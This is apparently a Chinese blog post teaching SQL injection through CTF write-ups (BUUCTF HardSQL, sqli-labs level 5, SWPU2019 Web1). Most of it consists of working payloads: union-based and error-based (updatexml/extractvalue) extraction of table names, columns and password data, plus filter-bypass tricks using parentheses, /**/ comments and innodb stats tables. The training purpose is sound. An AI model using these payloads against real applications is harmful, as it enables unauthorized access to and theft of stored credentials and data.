---
title: '快速入门web-sql注入及buuctf西电题解'
categories:
  - 
tags: []
abbrlink: 790de29c
date: 2026-03-07 14:30:56
---
# 快速入门web-sql注入及buuctf西电题解

## 08 第八章 天衍真言，星图显圣 题解

1.判断字段数order by 2



2.判断回显位

'union select  1,2#

Welcome 1



3.数据库名

'union select database()#

Welcome user



4.尝试查询数据库名为user下的所有表名

'union select group_concat(table_name),2 from information_schema.tables where table_schema='user'#

Welcome flag,users



5.尝试查询 数据库名为user，表名为flag 下的所有列名

'union select group_concat(column_name),2 from information_schema.columns where table_schema='user' and table_name='flag'#

Welcome value



6.查找数据

错误答案：'union select value,2 from flag#   //忘记加数据库名了

'union select value,2 from user.flag#









## [极客大挑战 2019]HardSQL

### 1



**第一关：寻找注入点**



username=1'&password=1

报错显示表明：字符型注入

![image-20260122150134815](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122150134815.png)





username=1' #&password=1

有过滤，可能是空格？

![image-2170920260122145229.png](/images/image-2170920260122145229.png)





去掉空格还是被过滤，可能是其他啥被过滤了

username=1 #&password=1

![image-20260122145442784](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122145442784.png)





查询列被过滤

![image-20260122145850956](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122145850956.png)

后面了查询字段被过滤，双写也被过滤



自然正常的回显我们没办法拿到，那我们就试试不正常的——报错注入



**第二关：报错注入**



用 `updatexml()` 或 `extractvalue()` 函数即可

举例：updatexml()



1.寻找数据库名

```
username=1'or(updatexml(1%2cconcat(0x7e%2cdatabase()%2c0x7e)%2c1))%23&password=1
```

![image-20260122154125194](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122154125194.png)



### 问题：

##### 1. 报错注入为什么不需要 `UNION SELECT`？

- **Union 注入**：它需要网页本身有一个专门展示查询结果的“框”（回显位），数据才能印在框里。
- **报错注入**：不需要原网页有任何“框”。它利用系统的**错误日志回显机制**。当数据库运行出错且后端代码没有关闭错误显示时，数据库会将错误描述直接打印。



##### 2. 注入中为什么用 `or` 而不是 `and`？

在 SQL 逻辑中

- **`and` 的局限性**： `and` 要求左右两边的条件都为真。

  如果后端 SQL 是 `WHERE username='admin' AND password='...'`，你注入 `admin' and [报错函数]#`，只有当 `admin` 这个用户确实存在时，数据库才会去执行后面的报错函数。如果用户名猜错了，整条语句直接返回假，报错函数可能根本不会被触发。

- **`or` 的优势**： `or` 只要有一边为真，逻辑就成立。





2.找表名

传统的”=“被过滤，可以用 where table_schema like database

![image-20260122160435978](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122160435978.png)

构造：where(table_schema)like(database())

```
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#&password=1

->
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&password=1

```

得到：XPATH syntax error: '~H4rDsq1~'

![image-20260122160857136](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122160857136.png)



3.找列名



```
username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('h4rdsq1')),0x7e),1))#&password=1

注意这里like('h4rdsq1')要加引号：明确名字和数据的区别
涉及=就涉及值，如果不加会被当作另一个名字，那谁是h4rdsq1的值呢？
前面的database()不用加是因为他本身是个函数。
```

得到

![image-20260122161315341](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122161315341.png)



4.找数据

```
username=1'or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(id,username,password))from(H4rDsq1))%2c0x7e)%2c1))%23&password=1
```



![image-20260122163256229](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122163256229.png)

去掉id，username，发现不够长，因为`updatexml` 的 **32 字符限制**

```
username=1'or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(password))from(H4rDsq1))%2c0x7e)%2c1))%23&password=1

XPATH syntax error: '~flag{d43011cb-4890-4bfe-86bb-6f'
```



![image-20260122163334796](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122163334796.png)



用right找剩下的部分（从右到左多少位）

### `right()` 函数的语法

```
right(字符串, 长度)
```



```
username=1'or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(right(password,30)))from(H4rDsq1))%2c0x7e)%2c1))%23&password=1

XPATH syntax error: '~b-4890-4bfe-86bb-6f43edc9a887}~'
```

得到

![image-20260122163813994](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122163813994.png)



拼接：'flag{d43011cb-4890-4bfe-86bb-6f43edc9a887}'



注意：整个过程中，千万别把&编码，因为：

当你写 `&password=1` 时，浏览器知道 `password` 是第二个参数。

当你写 `%26password%3d1` 时，服务器会认为 `%26` 只是 `username` 参数内容的一部分。





### 举例extractvalue()

### 1. `extractvalue()` 函数结构

`extractvalue(xml_frag, xpath_expr)` 两个参数：

- **第一个参数**：XML 碎片的名称（可以随便填，通常填 `1`）。
- **第二个参数**：XPath 表达式。如果这个表达式语法错误，MySQL 就会把错误信息连同你执行的结果一起弹出来。

------

### 2. 构造 Payload 的逻辑

与之前一样，我们利用 `concat()` 在查询结果前后加上波浪号 `~`。因为波浪号不是合法的 XPath 字符，所以会导致报错。

**获取前半段的 Payload：**

```
username=1'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))%23&password=1
```

------

### 3. 应对 32 位限制（翻页读取）

`extractvalue()` 同样有 **32 个字符** 的报错显示限制。因此，我们也需要配合 `mid()` 函数来读取 Flag 的不同部分。

**读取第 1 到 31 位：**

```
username=1'or(extractvalue(1,concat(0x7e,(select(mid(group_concat(password),1,31))from(H4rDsq1)),0x7e)))%23&password=1
```

**读取第 32 到 62 位：**

```
username=1'or(extractvalue(1,concat(0x7e,(select(mid(group_concat(password),32,31))from(H4rDsq1)),0x7e)))%23&password=1
```

------

### 4. `updatexml()` vs `extractvalue()` 的区别

| **特性**         | **updatexml()**      | **extractvalue()**       |
| ---------------- | -------------------- | ------------------------ |
| **参数个数**     | 3 个                 | 2 个                     |
| **报错长度限制** | 32 字符              | 32 字符                  |
| **核心原理**     | 路径参数错误触发报错 | XPath 格式错误触发报错   |
| **优势**         | 极其通用             | 字符数更少，Payload 更短 |

------











## sqli-5题解

对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息



1.判断有无注入点 

?id=1 ?id=1' ，两个页面返回不一样，说明没有过滤`'`,存在注入点

2.判断注入类型：

```cobol
//判断字符型
?id=1' and '1'='1
?id=1' and '1'='2

//判断数字型      
?id=1 and 1=1
?id=1 and 1=2
```

3.判断有几个字段

（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数=原始后台select列数

像这样：

【原始查询】     SELECT a, b, c FROM xxx
【你注入的查询】 UNION SELECT x, y, z）



?id=1' order by 3--+

?id=1' order by 4--+



4.确定回显位

?id=-1' union select 1,2,3--+

发现没有报错，也没回显，用报错注入

5.报表名(必须写0x7e，~在sql语法里面是另外一种意思)

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
```



```
XPATH syntax error: '~emails,referers,uagents,users~'
```

6.报列名

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e))--+
```

```
XPATH syntax error: '~id,username,password~'
```

7.报具体数据

```
select group_concat(username,'~',password) from users
```

```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+
```

```csharp
XPATH syntax error: '~Dumb~Dumb,Angelina~I-kill-you,D'
```







## [SWPU2019]Web1

### 1

https://yueyejian13.github.io/ctf/tricks/web1/

information_schema还有or，因为or被过滤，因此也无法使用。所以这里只能采用innodb_index_stats和 mysql.innodb_table_stats来进行绕过。



但是这俩都是功能性的东西，他们都无法查到列名

| **组件名称**             | **角色**         | **记录什么？**                                               | **作用**                                               |
| ------------------------ | ---------------- | ------------------------------------------------------------ | ------------------------------------------------------ |
| **`information_schema`** | **官方行政档案** | 仓库里所有的房间名（表）、每个房间里所有的货架名（列）、谁有权进入。 | 首选，但常被过滤。                                     |
| **`innodb_table_stats`** | **建筑维护记录** | 房间（表）的大小、有多少箱货物（行数）。                     | 当info库被封时，用来查表名。                           |
| **`innodb_index_stats`** | **物流追踪表**   | 哪些货架被贴了快递单（索引）、追踪这些快递的效率。           | **找房间名+索引线索**。比 table_stats 多一点索引信息。 |



![image-2170920260126121455.png](/images/image-2170920260126121455.png)



![image-2170920260126143530.png](/images/image-2170920260126143530.png)



```
1'/**/union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_index_stats/**/where/**/database_name="web1"'
```





```
1'/**/union/**/select/**/1,2,(select/**/group_concat(bb)/**/from/**/(select/**/1,2/**/as/**/aa,3/**/as/**/bb/**/union/**/select/**/*/**/from/**/users)as/**/a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```



```
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22' 
```



![image-20260126143751776](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260126143751776.png)



```
1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```



![image-20260126144012293](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260126144012293.png)





![image-20260126145715087](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260126145715087.png)







![image-20260126154755151](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260126154755151.png)
